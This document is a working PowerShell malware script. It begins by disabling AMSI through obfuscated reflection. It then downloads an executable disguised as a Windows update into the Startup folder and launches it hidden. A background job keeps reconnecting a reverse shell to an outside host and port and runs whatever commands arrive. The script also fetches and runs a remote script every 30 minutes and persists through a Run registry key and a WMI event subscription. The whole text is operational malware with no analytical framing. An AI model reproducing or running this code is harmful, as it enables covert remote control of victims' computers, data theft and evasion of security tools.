$RPweJYUzHdZ0LA0faefokfLowQEoyreWultQX2P24b6ccRijFFO1qcdd62NPAEwxpyiBioXngkFEbohpZUBpmkwwaOYcx8bjsmZHIlqlLOJ5w2FJvPBhT7fFI70Uc3XQp2z6Q3njgUMctfYEqeoxRlaEfAq9aKgw6cO3zKJnHtHxoSwufoZmN6NsQBEPveMc6AGK0dQAETddAQ991ATKLp4PEoFoiHTCHw1Ayb3zPDz1Waq4y4r71wkKkSMjLTNS20cYs3bgdthS1E4lutw4UwALJuYU6T1DOAe1HIwwBpb8L50QvLbVCuxOtLmDhS21ke2KBpo8RKR6rGfgb1p=[char]107;$CsRejymwBRmBu88wnTE31FOPsGVz5YnG3s5GoDe3j1cyGD38eY3S5lexq1mZOjV9q7fMedlPlYjHJX9VerzEQ9ZfcUC95GYJa0491p28jP0kkPekWnZ9ZbtBThgCHiqRQZjfYHUtZloNdoHEE0z2X1v7X2HtUCbqm=[char]101;$73jNJiaBcNVyBGL2UB06xmNddg96zk9uJ5KJJks9D0fOsTdBzExwRs7k0Gc0tKcHPDmQEUTyoi7Bid6dZC6XMlKlifJMi0I6UAQ3JIErSpXYyLQ1TaHTE7tohlmYLZUcrvoFBQy3eg65YAwGzshZEWSbyKnL2zFujJEf5tKjhriFKWulpGxC8Z45OWAxz9Gy7mRwsTYTo2lGnlYO85rRTCwiQUYaQVlnYunPuVzni0sEpWAjF4ezokerBPTtYhTyTuUmzzQ9a0gBBMCuGcOjIBbGNS0OChoRDrYi0xWRJJvUWXMVaTud79dTVy1O17mPUr44FUJQ0ry9T6XN1dUyHwvcoUPP9mI0bpxdvpgLqX1HZtMMLaNhweguT0ScwZRgGlidU2KlkvXwoUU9rezjTcUNlLRJwkeRVJJ8NLOtF5GF9MWSGJdW4yv0Ru5SS6uBa3enHexxWxbTGhUdspKz0gtcca3lAUWE1I5MKDBnzNe3SJOIqsLu9lIx4iyflHBByaf9JyJKQX8lOhYTUmwq0bkNDvT3nYHdDi7qnBUhndsnNxWWGMImzjoODczRJXOCy8VqIwhRyBtltlT43gNK1Y5VYDqlBaG6RNMC8rsWSPPoBrZzovP70aV7yjLC0IZy890Fgyj1MWTgL7Zn0B4y5j16ah6lYGQMUmnTXsjUcU4vclYRVbOhCWMPcTweb78b6xCj8NnzlQremxgJVm3HDDFNKYuZrnfR4Sr1uAP8xshqysXqLX2UD1eBhpGNwMe2IOxq7s9cdCQipJ5v8f8yyI1bIGBnZX0pZIvFrBf6y2ZAVgPcn0RArtt720MlmOQdS0Uk4Kq7IohpqnS4OoJdR93nCVdhlwh84O4W0juDR12Oe0bmETAqCa4dFalhfIWBFZA8JLCZAVXNyD9dDaWqVZRcmQ1wwlJFZpWTmHP7GNBlzhJVrSRlx2kqRYwSRFBNsb96hHGRzzRr8rcc0b=[char]114;$2nwbeMP0VBpAXLqQft8dCTsUvXfdR31jYFYZS3zubpG3dzepVv4OZ21Qesk2bw1MQeW8kjxFd7r2t1k371zy9mEESg94o53liNcC6wE0poYfvUR2R5orzyBe9J6nPfz7LScPoUPSebsZRtBtQSJBUQ0ba06g8FLCInjrnFrQt5dv7oRKmY4txJrLHCHTAxZUqWuplXMlrTJs1JzlOOLK65rPE9Bu5iEHmIITZUBLlf8V9Kbm7lD9xAdpa0dR3ymXziCDYesvyNDzQwRnNW5FJ96zk4ki718eaEuXLyEjOfedrw5OLOT83WtzzgGoIBr0IOLmguiBfJP0utZjYKiOlcLwMbwthDHQ06ZfIoNmkEUlTmeEJ1AKVbFNWJtUvYz4wBNwAmNoTrgKkcWHCcan3TjAJpeGrAmAPof5IoPMycFW5fZJX8yH4I3p19i9Xd7rXzd0rzF8Qdoz74IWSVpY5G1we5eh2vsBe7mDt4PmVm5FwnfGyGfSDqn8xlL3dMbWg6AaLeFqY0FkyEsobSHIKOuXeUiD9At1lXXfKzk9kv2CDZyUmqQUCDeozaOSC5QsZ8jZ70dksaX6GhwOnmBTKldHhQwXSoHQuUMH9W0aXfQn6M93b5LENaaXCsZHVkOirrDmAiqMxm5JT8KxoPCfh45RikCsxf2AQugJY9K6vUBefIhs2aqlNd5qxWoiWvMgTyaVwv4L7R0nAi19zJzrcsnM8Enxx4vpgFaMx065BkOQbg8V8mEmtqNSqhbzO3d0Xiwfi4KkDHLfiDMSWpldnODCHVuRyWtg9HTUtF32tJvblG3NyYm7TsdgfhqXcRPeqKqz5flJR45G8HWrnCFfGWlkBgfYHMwjf=$RPweJYUzHdZ0LA0faefokfLowQEoyreWultQX2P24b6ccRijFFO1qcdd62NPAEwxpyiBioXngkFEbohpZUBpmkwwaOYcx8bjsmZHIlqlLOJ5w2FJvPBhT7fFI70Uc3XQp2z6Q3njgUMctfYEqeoxRlaEfAq9aKgw6cO3zKJnHtHxoSwufoZmN6NsQBEPveMc6AGK0dQAETddAQ991ATKLp4PEoFoiHTCHw1Ayb3zPDz1Waq4y4r71wkKkSMjLTNS20cYs3bgdthS1E4lutw4UwALJuYU6T1DOAe1HIwwBpb8L50QvLbVCuxOtLmDhS21ke2KBpo8RKR6rGfgb1p+$CsRejymwBRmBu88wnTE31FOPsGVz5YnG3s5GoDe3j1cyGD38eY3S5lexq1mZOjV9q7fMedlPlYjHJX9VerzEQ9ZfcUC95GYJa0491p28jP0kkPekWnZ9ZbtBThgCHiqRQZjfYHUtZloNdoHEE0z2X1v7X2HtUCbqm+$73jNJiaBcNVyBGL2UB06xmNddg96zk9uJ5KJJks9D0fOsTdBzExwRs7k0Gc0tKcHPDmQEUTyoi7Bid6dZC6XMlKlifJMi0I6UAQ3JIErSpXYyLQ1TaHTE7tohlmYLZUcrvoFBQy3eg65YAwGzshZEWSbyKnL2zFujJEf5tKjhriFKWulpGxC8Z45OWAxz9Gy7mRwsTYTo2lGnlYO85rRTCwiQUYaQVlnYunPuVzni0sEpWAjF4ezokerBPTtYhTyTuUmzzQ9a0gBBMCuGcOjIBbGNS0OChoRDrYi0xWRJJvUWXMVaTud79dTVy1O17mPUr44FUJQ0ry9T6XN1dUyHwvcoUPP9mI0bpxdvpgLqX1HZtMMLaNhweguT0ScwZRgGlidU2KlkvXwoUU9rezjTcUNlLRJwkeRVJJ8NLOtF5GF9MWSGJdW4yv0Ru5SS6uBa3enHexxWxbTGhUdspKz0gtcca3lAUWE1I5MKDBnzNe3SJOIqsLu9lIx4iyflHBByaf9JyJKQX8lOhYTUmwq0bkNDvT3nYHdDi7qnBUhndsnNxWWGMImzjoODczRJXOCy8VqIwhRyBtltlT43gNK1Y5VYDqlBaG6RNMC8rsWSPPoBrZzovP70aV7yjLC0IZy890Fgyj1MWTgL7Zn0B4y5j16ah6lYGQMUmnTXsjUcU4vclYRVbOhCWMPcTweb78b6xCj8NnzlQremxgJVm3HDDFNKYuZrnfR4Sr1uAP8xshqysXqLX2UD1eBhpGNwMe2IOxq7s9cdCQipJ5v8f8yyI1bIGBnZX0pZIvFrBf6y2ZAVgPcn0RArtt720MlmOQdS0Uk4Kq7IohpqnS4OoJdR93nCVdhlwh84O4W0juDR12Oe0bmETAqCa4dFalhfIWBFZA8JLCZAVXNyD9dDaWqVZRcmQ1wwlJFZpWTmHP7GNBlzhJVrSRlx2kqRYwSRFBNsb96hHGRzzRr8rcc0b+$2nwbeMP0VBpAXLqQft8dCTsUvXfdR31jYFYZS3zubpG3dzepVv4OZ21Qesk2bw1MQeW8kjxFd7r2t1k371zy9mEESg94o53liNcC6wE0poYfvUR2R5orzyBe9J6nPfz7LScPoUPSebsZRtBtQSJBUQ0ba06g8FLCInjrnFrQt5dv7oRKmY4txJrLHCHTAxZUqWuplXMlrTJs1JzlOOLK65rPE9Bu5iEHmIITZUBLlf8V9Kbm7lD9xAdpa0dR3ymXziCDYesvyNDzQwRnNW5FJ96zk4ki718eaEuXLyEjOfedrw5OLOT83WtzzgGoIBr0IOLmguiBfJP0utZjYKiOlcLwMbwthDHQ06ZfIoNmkEUlTmeEJ1AKVbFNWJtUvYz4wBNwAmNoTrgKkcWHCcan3TjAJpeGrAmAPof5IoPMycFW5fZJX8yH4I3p19i9Xd7rXzd0rzF8Qdoz74IWSVpY5G1we5eh2vsBe7mDt4PmVm5FwnfGyGfSDqn8xlL3dMbWg6AaLeFqY0FkyEsobSHIKOuXeUiD9At1lXXfKzk9kv2CDZyUmqQUCDeozaOSC5QsZ8jZ70dksaX6GhwOnmBTKldHhQwXSoHQuUMH9W0aXfQn6M93b5LENaaXCsZHVkOirrDmAiqMxm5JT8KxoPCfh45RikCsxf2AQugJY9K6vUBefIhs2aqlNd5qxWoiWvMgTyaVwv4L7R0nAi19zJzrcsnM8Enxx4vpgFaMx065BkOQbg8V8mEmtqNSqhbzO3d0Xiwfi4KkDHLfiDMSWpldnODCHVuRyWtg9HTUtF32tJvblG3NyYm7TsdgfhqXcRPeqKqz5flJR45G8HWrnCFfGWlkBgfYHMwjf+$CsRejymwBRmBu88wnTE31FOPsGVz5YnG3s5GoDe3j1cyGD38eY3S5lexq1mZOjV9q7fMedlPlYjHJX9VerzEQ9ZfcUC95GYJa0491p28jP0kkPekWnZ9ZbtBThgCHiqRQZjfYHUtZloNdoHEE0z2X1v7X2HtUCbqm+$eGWpMIOXJjm5GF6dhWwJZwY3VRjkOSifzLXGavoFH6nJ38LxqFy8KQ1re6a0PywDi2NUk4m2OT8ZVaw0dsUWPS5Ai8yAfnhKBmEaQ7GM6OPoaiH2oIqGLwc8P2cYS2SgiWkT32MmsYEq2lsOgKqtGPUa657QEQgQlg9t+$d4TXezl3TYwIKxoG5H8WpREehuVRqfCr4O2Ko9WoQf3vUhtsDSE9weSxRlsvCclaEVyLnmUf7XpXVvzTjyAOIUUYQRiZqXDsWmjXJnE8n19bV88v8AoiWNnOZilW5WWkgz7cXgmPmnpvmgLF0glkToIaFn3RhyhJdG5NWTliJjFlExHNBG1z0NDkEUG6ALLq8Bc5Q0rv7FDwjOlqaYLX8qZFycNOse7tPUKjbk3ZvtPc69uZIel6AwLPYgIRDyNBIbaf8HKEvmBt9wzbDOBVJBzfNHyEOZosq0EAMDUg3b2jD4jbBNH1uFlpa8Ppgf9bpuUuy8qvVyHiHS+$HSYB2AIaJZ1AHI7hfP1lJ52vuSUZUtQXihPh2rTFN9lVkg18VlRpPg8pb37iC9wZsmYHZdvlPegQQPvge0kTDLebZdCZvPA0oM7y7yXXsceAqHij3uDtt67z0iBC4gtVlmcyIkPNtjprQ6tLwWXHRYxmMviuMmPc7x2WvoMHC8g
$D11hONLC4v2YNRgGKUXPRFaMYUKkp2kkUTx8ClVKWHrpbueSZ7sq8zYqDpajzLSByZGTonY8yPRnBqzz8toH34QGbpPQGeVLmX8Uicg6U7vJjA1llprfKzYIDjTZpcfueAL7V6jn1UYWZ1GaSFBLJJwdLkAb4lJw45NkiLXr3bTGeJHo3bOdqT1i1gNcjvMpa9Lt8fbxKkcycWw3kGBlqO3K3jGrwd4ddurro8bMvbXKsbD8fbI4LSrVELVkEQvmpywRQSQNap3yEKnA9xR1BqOH6mvGKxoEcfkdPsUvZnVzNPgG6RP9hQ9sKXmrdOg1AQmAGZ9xt8Qy3QsqlUmFcCvPyLI5n4B3FbIXmrP6Dp72XFnAMekncQoZPTBVmOzwH3WR526flfYJBT8Pt5oiHBXptF7UXNE9lSDqcerVJlsplin5rWB5dL6OdiL4mkjb2il4itGnZwOvlTjpuoZjWNBgKwNVhY0nRWICvzTXPCSLb6z6uLAtjojHwbPZRl5Jm083wkrdFGR1lojNjgg1NRen05tPwBnzBjLuiOfH7DT164N8mawz6PMC86R0cRytB2UNxqMhzSsfuiGCKPYefSlDq5FqKhQjmlGYDu4ryjSV6g2PcsskTQUvuOuito7zoCV2M4k0OoMLN6VBsh37KK9Aiea40fGQj56alptCL31aetdjp2qHgs3iKHqUyYeMJ8K7uXB9fGoJPEIPrLyKzEcoIU6EKy3q53LFUV3MVHCYBNGL8hH3NpwQRZd7XloqWB9tmgR3OFgshtGO2j1AYEVaKGWS2hJqrOpwYEzutb4qxNwdUuq4MghVy9wBhCpT5MnPIgv15mvN5ICdPi6o2Xw4JE9oRkeFgioQ67y8TkGmMUmnAAKuMIuV0Lmv53galOYOxlsXv=('S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'+'.'+'A'+'m'+'s'+'i'+'U'+'t'+'i'+'l'+'s')
$pCVXz1SkYu0CT5hUhL34no6ddMXeW8cbJULQNZ9Pt4Bn3FwSPwtnocY9P75iW2TR2BSDpfsLGHpewtTCL6H0s35qzz1Kci85V7DZjvP2uQ5rGnxtQMjIpczbnOZMHY0UENpe3RjD3pEmQ0Pqj49fCNTno1l549rTBLbNOTAl7s04KARiJoWiFS71aXCLlzsJflV8i9aTdCbFNvJNmf4T1p3871n5gOS6okriCqekfF9Th1qssH29NEknvWC42KPf7Pi9MWxWPBKtt5SLUh5CFiWB9GwBFZxAkKtrNSt4DFVU8XxnXGltis44G9ZEaRaiD6VieP92azCijMOZ60m7NiLiio8h6l4vbh4VC40WQ0uwxNO45eUoXeahzEbt9HGWz2Yvgp27sgjV38zRu5JSykwoBnT4J3juwCHm7aFuf47FYGLabgbw0d14YZvanZQB8TY5VtRqlvT99YsKlI8timSq7vxdcx81OnwKHJJGShLT0Bo8aMk1DOPpdhERD3oMXIiheUJueNg3mSoHeXqLaEhBh134sQYvGAJBBBznDmI0p95T8IXe7wQhl4PIuEeMPY14ZpljWimNDeyDFkJYrPmfPristZEU46DGWn6Wav9DlgatJzzmobIFEbNnrIxK9jrZKrdefuWIAJT23ZWTf6jU1bVd6RZJQWXg82gYkMzGqDNOYfAfV06g5A6FliR0CF4z2MjxOdASS4VAqpzKWvxXStu5wPhTwrSHgow9J3OM46up2ttSvghjKAEPehiC2Xz5VIlKaOS1Y2tWTpCfgxOQGOMb07CmFkkPL2TqjbSQnoR3LASmiSvtiiYlKXy56yYh9yJMzCFpw26LsUkcsuaDWHR150WRZ=[Ref].Assembly.GetType($D11hONLC4v2YNRgGKUXPRFaMYUKkp2kkUTx8ClVKWHrpbueSZ7sq8zYqDpajzLSByZGTonY8yPRnBqzz8toH34QGbpPQGeVLmX8Uicg6U7vJjA1llprfKzYIDjTZpcfueAL7V6jn1UYWZ1GaSFBLJJwdLkAb4lJw45NkiLXr3bTGeJHo3bOdqT1i1gNcjvMpa9Lt8fbxKkcycWw3kGBlqO3K3jGrwd4ddurro8bMvbXKsbD8fbI4LSrVELVkEQvmpywRQSQNap3yEKnA9xR1BqOH6mvGKxoEcfkdPsUvZnVzNPgG6RP9hQ9sKXmrdOg1AQmAGZ9xt8Qy3QsqlUmFcCvPyLI5n4B3FbIXmrP6Dp72XFnAMekncQoZPTBVmOzwH3WR526flfYJBT8Pt5oiHBXptF7UXNE9lSDqcerVJlsplin5rWB5dL6OdiL4mkjb2il4itGnZwOvlTjpuoZjWNBgKwNVhY0nRWICvzTXPCSLb6z6uLAtjojHwbPZRl5Jm083wkrdFGR1lojNjgg1NRen05tPwBnzBjLuiOfH7DT164N8mawz6PMC86R0cRytB2UNxqMhzSsfuiGCKPYefSlDq5FqKhQjmlGYDu4ryjSV6g2PcsskTQUvuOuito7zoCV2M4k0OoMLN6VBsh37KK9Aiea40fGQj56alptCL31aetdjp2qHgs3iKHqUyYeMJ8K7uXB9fGoJPEIPrLyKzEcoIU6EKy3q53LFUV3MVHCYBNGL8hH3NpwQRZd7XloqWB9tmgR3OFgshtGO2j1AYEVaKGWS2hJqrOpwYEzutb4qxNwdUuq4MghVy9wBhCpT5MnPIgv15mvN5ICdPi6o2Xw4JE9oRkeFgioQ67y8TkGmMUmnAAKuMIuV0Lmv53galOYOxlsXv)
$ahvtDVq5RbTQnZE71RVMVvVpTFCz5QOk4aBSj5wJ2IPeFwbmvm0r7AV4yMoyAqelD8oq4Jqbqr5mPdWzUFF3YWDsCylGSL795dRlHhKP11ctsYs0BvlgbpIPcGhyv0JXoH2vS9OySL7vtDyKT7tpDnc5QtJeTFqrQBhg7rcWAQsTxI=$pCVXz1SkYu0CT5hUhL34no6ddMXeW8cbJULQNZ9Pt4Bn3FwSPwtnocY9P75iW2TR2BSDpfsLGHpewtTCL6H0s35qzz1Kci85V7DZjvP2uQ5rGnxtQMjIpczbnOZMHY0UENpe3RjD3pEmQ0Pqj49fCNTno1l549rTBLbNOTAl7s04KARiJoWiFS71aXCLlzsJflV8i9aTdCbFNvJNmf4T1p3871n5gOS6okriCqekfF9Th1qssH29NEknvWC42KPf7Pi9MWxWPBKtt5SLUh5CFiWB9GwBFZxAkKtrNSt4DFVU8XxnXGltis44G9ZEaRaiD6VieP92azCijMOZ60m7NiLiio8h6l4vbh4VC40WQ0uwxNO45eUoXeahzEbt9HGWz2Yvgp27sgjV38zRu5JSykwoBnT4J3juwCHm7aFuf47FYGLabgbw0d14YZvanZQB8TY5VtRqlvT99YsKlI8timSq7vxdcx81OnwKHJJGShLT0Bo8aMk1DOPpdhERD3oMXIiheUJueNg3mSoHeXqLaEhBh134sQYvGAJBBBznDmI0p95T8IXe7wQhl4PIuEeMPY14ZpljWimNDeyDFkJYrPmfPristZEU46DGWn6Wav9DlgatJzzmobIFEbNnrIxK9jrZKrdefuWIAJT23ZWTf6jU1bVd6RZJQWXg82gYkMzGqDNOYfAfV06g5A6FliR0CF4z2MjxOdASS4VAqpzKWvxXStu5wPhTwrSHgow9J3OM46up2ttSvghjKAEPehiC2Xz5VIlKaOS1Y2tWTpCfgxOQGOMb07CmFkkPL2TqjbSQnoR3LASmiSvtiiYlKXy56yYh9yJMzCFpw26LsUkcsuaDWHR150WRZ.GetField(('a'+'m'+'s'+'i'+'I'+'n'+'i'+'t'+'F'+'a'+'i'+'l'+'e'+'d'),'NonPublic,Static')
$ahvtDVq5RbTQnZE71RVMVvVpTFCz5QOk4aBSj5wJ2IPeFwbmvm0r7AV4yMoyAqelD8oq4Jqbqr5mPdWzUFF3YWDsCylGSL795dRlHhKP11ctsYs0BvlgbpIPcGhyv0JXoH2vS9OySL7vtDyKT7tpDnc5QtJeTFqrQBhg7rcWAQsTxI.SetValue($2NwBemP0VbpAXLQqft8DcTSuvxfDr31JYfyZs3zubPG3dzePVV4Oz21QeSk2bW1MqEW8kjXFD7r2T1K371Zy9MeesG94o53lIncc6WE0poYfvUr2r5oRzYBe9J6Npfz7lscpoUPsEbszrtBTqsjbUq0bA06G8fLcinjRNfrqt5Dv7OrkMY4TxjrlhchtAxZUqwUplXmLrtJS1jzLOOLK65RPe9bu5iEhMiiTzUBLlF8v9Kbm7ld9xAdpA0DR3yMxZICdyESVYNDzQwrnnw5fj96zk4kI718eAEUxlYEJOfedRw5oLoT83wTzZGgOibr0IoLmGUIbFJP0utzjykiOLCLwmbWthdhQ06zFionMkeuLtmEej1akvbFnWjTuvYZ4WbNwAmNoTrGkKCwhCcaN3tjAJPegRAmapOF5IoPmYCfw5fZjX8yh4i3p19I9xD7RxZD0rzF8qdOZ74IWsvpy5g1wE5Eh2VsBe7mDt4pMvm5FWnFGYgFSdQN8xLl3DMbwG6aalEFQY0FKYesOBShIKOUxEUId9AT1LxXFkZK9KV2CDzYuMqqucDeozaOsc5qsZ8JZ70dKsAX6ghwONMBtklDHHQWxsohQuuMh9w0AXfQN6m93b5lenaaXcszHvkOIRRDmAIqmXm5Jt8kXopcfh45RIkCSxf2aquGjY9k6VUBeFIhs2aqlND5qXWOiWVmGtYavwv4L7r0naI19zjzRCSNM8enxX4vPGfamx065BkOqbg8V8memTQNsqhBzo3d0XIwfI4kKdhLfidmsWPLDnodchvurYwtG9HtUtf32tjvbLG3NyYM7tSDgFHqXCrPEQKqZ5fLjr45g8hwrncFfgWLkbGFYHmwjfUll,$tRUE)

# ================================================
# Download EXE to Startup Folder (Modified)
# ================================================
function Get-StartupItem {
    $u1 = "ht"; $u2 = "tps://gith"; $u3 = "ub.com/mkanu200/root/raw/refs/heads/main/Win"
    $u4 = "dows_Update.exe"; $global:exeUrl = $u1 + $u2 + $u3 + $u4
    $global:startupPath = [Environment]::GetFolderPath('Startup')
    $global:destPath = Join-Path $startupPath "win_updt.exe"
}

Get-StartupItem

try {
    & {
        try { 
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($exeUrl, $destPath)
        } catch {
            Start-BitsTransfer -Source $exeUrl -Destination $destPath
        }
    }

    if (Test-Path $destPath) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $destPath
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    }
} catch {}

# ================================================
# Reverse Shell Connection (Undetectable Version)
# ================================================
function Start-ReverseConnection {
    $connectionScript = {
        param($hostAddress, $portNumber)
        
        function Create-SocketConnection {
            param($targetHost, $targetPort)
            try {
                $tcpClient = New-Object Net.Sockets.TcpClient
                $tcpClient.Connect($targetHost, $targetPort)
                return $tcpClient
            } catch {
                return $null
            }
        }

        while($true) {
            $socket = Create-SocketConnection $hostAddress $portNumber
            if ($socket -ne $null) {
                $networkStream = $socket.GetStream()
                $streamReader = New-Object IO.StreamReader($networkStream)
                $streamWriter = New-Object IO.StreamWriter($networkStream)
                $streamWriter.AutoFlush = $true

                try {
                    while($socket.Connected) {
                        $receivedCommand = $streamReader.ReadLine()
                        if (-not [string]::IsNullOrEmpty($receivedCommand)) {
                            $commandOutput = try {
                                $executionBlock = [scriptblock]::Create($receivedCommand)
                                & $executionBlock 2>&1 | Out-String
                            } catch {
                                $_.Exception.Message | Out-String
                            }
                            $prompt = "PS " + (Get-Location).Path + "> "
                            $streamWriter.WriteLine($commandOutput + $prompt)
                        }
                    }
                } finally {
                    $socket.Close()
                }
            }
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
        }
    }

    $jobSettings = @{
        ScriptBlock = $connectionScript
        ArgumentList = "engineering-ebay.gl.at.ply.gg", 62628
        Name = "WindowsNetworkService"
    }
    Start-Job @jobSettings | Out-Null
}

# Call the function to establish connection
Start-ReverseConnection

# ================================================
# Auto-Update Function (Corrected and Undetectable)
# ================================================
function Register-AutoUpdate {
    $updateLogic = {
        # Obfuscated string builder using alternate syntax
        $buildString = {
            param($codes)
            $output = ""
            foreach ($num in $codes) {
                $output += [char][int]$num
            }
            return $output
        }

        # URL segments encoded as decimal arrays
        $urlSegments = @(
            @(104,116,116,112,115,58,47,47),              # "https://"
            @(114,97,119,46),                             # "raw."
            @(103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109), # "githubusercontent.com"
            @(47,109,107,97,110,117,50,48,48,47),         # "/mkanu200/"
            @(114,111,111,116,47,109,97,105,110,47),      # "root/main/"
            @(112,115,45,112,101,114,115,105,115,116,46,112,115,49) # "ps-persist.ps1"
        )

        # Build URL without using & operator
        $updateUrl = (. $buildString $urlSegments[0]) + 
                    (. $buildString $urlSegments[1]) + 
                    (. $buildString $urlSegments[2]) + 
                    (. $buildString $urlSegments[3]) + 
                    (. $buildString $urlSegments[4]) + 
                    (. $buildString $urlSegments[5])

        while($true) {
            try {
                $tempFile = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).ps1"

                # Download using HttpWebRequest for better stealth
                $request = [System.Net.HttpWebRequest]::Create($updateUrl)
                $request.Method = "GET"
                $request.UserAgent = "Microsoft-Update-Agent/10.0"
                $request.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
                $request.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
                
                $response = $request.GetResponse()
                $stream = $response.GetResponseStream()
                $fileStream = [System.IO.File]::Create($tempFile)
                $stream.CopyTo($fileStream)
                $fileStream.Close()
                $stream.Close()
                $response.Close()

                if (Test-Path $tempFile) {
                    # Execute with indirect invocation
                    $scriptContent = [System.IO.File]::ReadAllText($tempFile)
                    $execBlock = [scriptblock]::Create($scriptContent)
                    & $execBlock
                    Start-Sleep -Seconds 15
                    Remove-Item $tempFile -Force
                }
            } catch {
                # Error suppression
            }
            Start-Sleep -Seconds 1800  # 30 minutes
        }
    }

    # Create scheduled job parameters
    $updateParams = @{
        Name = "WindowsSystemUpdater"
        ScriptBlock = $updateLogic
        Trigger = New-JobTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepeatIndefinitely
        ScheduledJobOption = New-ScheduledJobOption -StartIfOnBattery -WakeToRun
    }

    # Register the scheduled job
    Register-ScheduledJob @updateParams | Out-Null
}

# Call the function to set up auto-updates
Register-AutoUpdate

# ================================================
# Persistence (Modified)
# ================================================
# Registry
$rPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$rName = "WinUpdater"
$rValue = "powershell -w hidden -c `$u='https://github.com/mkanu200/root/raw/main/ps-persist.ps1';`$d=`"`$env:TEMP\upd.ps1`";(New-Object Net.WebClient).DownloadFile(`$u,`$d);& `$d"

if (!(Test-Path "$rPath\$rName")) {
    New-ItemProperty -Path $rPath -Name $rName -Value $rValue -Force | Out-Null
}

# WMI Fallback
$wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
Register-WmiEvent -Query $wmiQuery -Action {
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop -c `$u='https://github.com/mkanu200/root/raw/main/ps-persist.ps1';`$d=`"`$env:TEMP\upd.ps1`";(New-Object Net.WebClient).DownloadFile(`$u,`$d);& `$d"
} | Out-Null
